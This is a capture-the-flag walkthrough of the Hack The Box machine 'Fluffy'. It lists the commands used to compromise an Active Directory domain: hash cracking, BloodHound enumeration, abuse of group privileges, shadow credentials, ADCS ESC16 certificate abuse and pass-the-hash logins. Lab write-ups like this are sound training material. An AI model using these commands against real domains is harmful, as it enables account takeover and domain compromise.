Difficulty: Easy
### Information Gathering

IP Address: 10.129.232.88
Username: `j.fleischman`
Password: `J0elTHEM4n1990!`

# User Flag
#### Service Enumeration

NMAP Enumeration through the ports.
```
sudo nmap 10.129.232.88
```

```
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

With more details.
```
sudo nmap 10.129.232.88 -sC -sV
```

An entry is added to the `/etc/hosts` file.
```
10.129.232.88	fluffy.htb dc01.fluffy.htb
```

SMB Enumeration returned a few shares.
```
netexec smb fluffy.htb -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
```

`IT` share is readable and writable.

```
smb: \> dir
  .                                   D        0  Sun Jul 26 08:04:12 2026
  ..                                  D        0  Sun Jul 26 08:04:12 2026
  Everything-1.4.1.1026.x64           D        0  Fri Apr 18 11:08:44 2025
  Everything-1.4.1.1026.x64.zip       A  1827464  Fri Apr 18 11:04:05 2025
  KeePass-2.58                        D        0  Fri Apr 18 11:08:38 2025
  KeePass-2.58.zip                    A  3225346  Fri Apr 18 11:03:17 2025
  temp.library-ms                     A      366  Sun Jul 26 08:05:02 2026
  Upgrade_Notice.pdf                  A   169963  Sat May 17 10:31:07 2025

		5842943 blocks of size 4096. 2066526 blocks available
smb: \> put exploit.zip
```

The hash can be cracked in hashcat.
```
hashcat -m 5600 hash.txt rockyou.txt
```

The credentials is `p.agila:prometheusx-303`

```
netexec smb fluffy.htb -u 'p.agila' -p 'prometheusx-303' --shares
```

Bloodhound enumeration is performed through this user.
```
bloodhound-ce-python -u 'p.agila' -p 'prometheusx-303' -ns 10.129.232.88 -d fluffy.htb -c All --zip
```

![[Screenshot 2026-07-26 at 14.50.23.png]]

It is possible to see that `p.agila` has `GenericAll` privileges.

```
net rpc group addmem "Service Accounts" "p.agila" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"
```

```
 net rpc group members "Service Accounts" -U "FLUFFY.HTB"/"p.agila"%"prometheusx-303" -S "dc01.fluffy.htb"

FLUFFY\ca_svc
FLUFFY\ldap_svc
FLUFFY\p.agila
FLUFFY\winrm_svc
```

The user has been successfully added to the group.

![[Screenshot 2026-07-26 at 14.54.35.png]]

Now, it possible to see that this group has `GenericWrite` privileges to 3 users.

`ca_svc` looks the most promising from the 3 ones.
Now, shadow credentials are performed.
```
certipy-ad shadow auto -username p.agila@fluffy.htb -password 'prometheusx-303' -account 'ca_svc'
```

`ca_svc`:`ca0f4f9e9eb8a092addf53bb03fc98c8`
`winrm`:`33bd09dcd697600edf6b3a7af4875767`

The user flag has been obtained through `winrm_svc`.
```
evil-winrm -i fluffy.htb -u winrm_svc -H 33bd09dcd697600edf6b3a7af4875767
```

![[Screenshot 2026-07-26 at 15.20.59.png]]

# Root Flag
#### Privilege Escalation

Certificates are checked through the user `ca_svc`.
```
certipy-ad find -u 'ca_svc@fluffy.htb' -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -vulnerable -stdout
```

`ca_svc` is vulnerable to `ESC16`.

https://www.hackingarticles.in/adcs-esc16-security-extension-disabled-on-ca-globally/

According to the guide, the certificate is now exploited.
```
certipy-ad account -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -upn administrator -user ca_svc update
```

```
certipy-ad shadow -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -account ca_svc auto
```

```
certipy-ad req -k -dc-ip 10.129.232.88 -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -ca 'fluffy-DC01-CA' -template 'User' -target dc01.fluffy.htb
```

```
certipy-ad account -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -upn ca_svc -user ca_svc update
```

```
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.232.88 -domain 'fluffy.htb'
```

Exploitation successful.
The administrator hash is `8da83a3fa618b6e3a00e93f676c92a6e`
```
evil-winrm -i fluffy.htb -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e
```

The root flag has been successfully obtained.
![[Screenshot 2026-07-26 at 15.44.55.png]]

